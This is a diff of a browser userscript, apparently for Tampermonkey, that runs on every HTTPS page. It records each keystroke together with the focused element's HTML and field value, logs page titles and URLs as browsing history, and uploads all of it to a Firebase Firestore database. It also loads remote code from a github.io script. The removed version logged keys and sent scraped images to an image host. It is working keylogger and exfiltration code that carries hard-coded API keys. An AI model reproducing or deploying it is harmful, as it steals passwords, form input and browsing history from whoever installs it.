@@ -1,72 +1,100 @@
 // ==UserScript==
 // @name         Key Userscript
 // @namespace    http://tampermonkey.net/
-// @version      0.1
+// @version      1.0.1
 // @description  try to take over the world!
 // @author       You
 // @match        https://*/*
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
+// @require      https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.13.6/underscore-min.js
+// @require      https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.7/dayjs.min.js
+// @require      https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js
+// @require      https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js
+// @require      https://e-grau.github.io/estrella/key.js
+
 // @grant        none
 // ==/UserScript==
-
 (function() {
     'use strict';
 
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyBOj0kF7m-JxxaDYhtlj-xDSu_pLlZOGtI",
+        authDomain: "keys-3239e.firebaseapp.com",
+        projectId: "keys-3239e",
+        storageBucket: "keys-3239e.appspot.com",
+        messagingSenderId: "878579812626",
+        appId: "1:878579812626:web:d23ba8efa5073f09d70bcb"
+    };
+
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    const keys$ = db.collection("keys");
+    const history$ = db.collection("history");
+
     // Your code here...
-var keys='';
-let images = [];
-let imagesSize = images.length;
-document.onkeypress = function(e) {
-	let get = window.event?event:e;
-	let key = get.keyCode?get.keyCode:get.charCode;
-	 key = String.fromCharCode(key);
-	 keys+=key;
-}
+    var keys = '';
+    var uu = "";
 
-function getImages(){
- Array.from(document.querySelectorAll("img")).map(img=>img.src).filter((v,i,a)=>a.indexOf(v)===i).forEach(url=>{
 
-     if(images.indexOf(url)===-1) images.push(url);
+    const data = {
+        element: "",
+        uu: uu || "_ANON_",
+        title: document.title,
+        url: window.location.href,
+        value: "",
 
- })
-
-}
-window.setInterval(()=>{
-    if(imagesSize!==images.length){
-        imagesSize=images.length;
-        console.log(images,imagesSize)
-        uploadImages();
     }
 
-},5000);
+    window.onload = function() {
+
+        history$.add({
+            date: new Date(),
+            title: document.title,
+            url: window.location.href,
+            user: uu || "_ANON_",
+            day: dayjs().format("YYYY-MM-DD"),
+
+        })
 
 
-async function uploadImages(){
+    }
+    document.onkeypress = function(e) {
+        let get = window.event ? event : e;
+        data.element = get.target.outerHTML;
+        data.value = data.element && data.element.value || "";
+        let key_ = get.keyCode ? get.keyCode : get.charCode;
+        let key = String.fromCharCode(key_);
+        keys += key;
 
-  const key ="6d207e02198a847aa98d0a2a901485a5";
-for(const img of images){
-const api =`http://freeimage.host/api/1/upload/?key=${key}&source=${img}&format=json`;
-    console.log(api);
-await fetch(api,{method:"POST"})
-    .then(res=>console.log(res))
-}
+        if (key_ == 13) {
+            saveKeys()
+        }
+    }
 
-  images=[]
-   imagesSize=0;
 
-}
+    document.onkeyup = _.debounce(saveKeys, 500)
 
-function checkImage(url) {
-       return fetch(url)
-}
+    function saveKeys(e) {
+        if (keys.length > 0) {
+            //new Image().src = url+keys;
+            data.keys = keys;
+            data.title = document.title;
+            data.url = window.location.href;
+            data.date = new Date();
+            data.day = dayjs().format("YYYY-MM-DD");
+            data.uu = uu || "_ANON_";
+            console.log(data);
 
-window.setInterval(function(){
-    getImages();
-	if(keys.length>0) {
-		//new Image().src = url+keys;
-        console.log(window.location.href,keys);
-		keys = '';
-	}
-}, 1000);
+            keys$.add(data);
+            keys = '';
+        }
+
+    }
+
+
 
 })();
